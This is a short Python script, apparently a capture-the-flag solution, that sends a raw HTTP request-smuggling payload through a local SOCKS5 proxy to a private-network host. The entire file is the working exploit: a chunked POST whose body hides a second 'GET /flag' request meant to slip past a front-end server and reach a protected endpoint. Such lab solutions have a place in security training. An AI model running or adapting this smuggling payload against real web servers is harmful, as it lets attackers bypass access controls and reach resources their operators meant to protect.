import socks,socket


def setup_socks_proxy(host="127.0.0.1", port=8123):
   socks.set_default_proxy(socks.SOCKS5, host, port)
   socket.socket = socks.socksocket


def send_request(target_host, target_port, payload):
   try:
       sock = socket.create_connection((target_host, target_port))
       sock.send(payload.encode())


       response = b""
       while True:
           chunk = sock.recv(4096)
           if not chunk:
               break
           response += chunk


       return response.decode(errors="ignore")
   finally:
       sock.close()


PROXY_HOST = "127.0.0.1"
PROXY_PORT = 8123
TARGET_HOST = "192.168.2.199"
TARGET_PORT = 54296


setup_socks_proxy(PROXY_HOST, PROXY_PORT)


smuggle_payload = (
   "POST /post HTTP/1.1\r\n"
   f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
   "Transfer-Encoding: chunked\r\n"
   "\r\n"
   "0GET /flag HTTP/1.1\r\n"
   "Host: 14828\r\n\r\n"
)

print(send_request(TARGET_HOST, TARGET_PORT, smuggle_payload))
